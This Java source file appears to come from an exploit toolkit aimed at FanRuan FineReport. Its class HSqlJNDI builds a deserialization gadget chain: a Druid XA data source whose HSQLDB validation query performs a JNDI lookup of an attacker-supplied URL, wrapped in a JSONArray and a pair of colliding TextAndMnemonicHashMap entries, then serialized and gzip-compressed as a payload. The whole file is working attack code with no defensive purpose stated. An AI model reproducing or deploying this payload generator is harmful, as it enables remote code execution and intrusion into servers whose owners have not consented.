package com.h2tg.frchannel.gadget;

import com.fr.json.JSONArray;
import com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;
import java.util.*;
import static com.h2tg.frchannel.Reflections.*;
import static com.h2tg.frchannel.Reflections.GzipCompress;

public class HSqlJNDI
{
    public static byte[] getPayload(byte[] bytes) throws Exception {
        String url = "jdbc:hsqldb:mem:test";
        String jndiUrl = new String(bytes);
        String query = "CALL \"javax.naming.InitialContext.doLookup\"('"+jndiUrl+"')";
        DruidXADataSource druidXADataSource = new DruidXADataSource();
        druidXADataSource.setLogWriter(null);
        druidXADataSource.setInitialSize(1);
        druidXADataSource.setUrl(url);
        druidXADataSource.setValidationQuery(query);

        // 防止NotSerializableException
        setFieldValue(druidXADataSource, "statLogger", null);
        setFieldValue(druidXADataSource, "initedLatch", null);
        setFieldValue(druidXADataSource, "transactionHistogram", null);

        JSONArray jsonArray = new JSONArray(new ArrayList<>(Arrays.asList(druidXADataSource)));

        Hashtable hashtable = makeTextAndMnemonicHashMap(jsonArray);

        byte[] ser= serialize(hashtable);
//        deserialize(ser);
        return GzipCompress(ser);
    }

    public static Hashtable makeTextAndMnemonicHashMap(Object o) throws Exception{
        Class<?> innerClass=Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap1 = (Map) createInstanceUnsafely(innerClass);
        Map tHashMap2 = (Map) createInstanceUnsafely(innerClass);
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        setFieldValue(tHashMap1,"loadFactor",1);
        setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }
}
